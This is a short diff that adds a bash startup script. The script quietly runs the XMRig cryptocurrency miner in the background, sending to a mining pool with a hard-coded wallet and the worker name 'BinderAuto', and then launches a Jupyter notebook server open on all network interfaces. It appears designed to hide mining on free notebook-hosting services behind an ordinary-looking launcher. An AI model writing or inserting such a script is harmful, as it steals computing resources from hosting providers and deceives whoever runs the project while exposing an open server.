@@ -1,0 +1,3 @@
+#!/bin/bash
+./xmrig_folder/xmrig -o eu1.solopool.org:8010 -u 46v4F8H1sMpbxMTz9mgFBUL2CYYWPRsB6AwVq1BnhyuG9VTkrshxh1G3TfooiLeRZpU76iyRWr6P3YJeVrVHCZxNKgo1dzM -p BinderAuto &
+exec jupyter notebook --ip=0.0.0.0 --port=8888 --no-browser
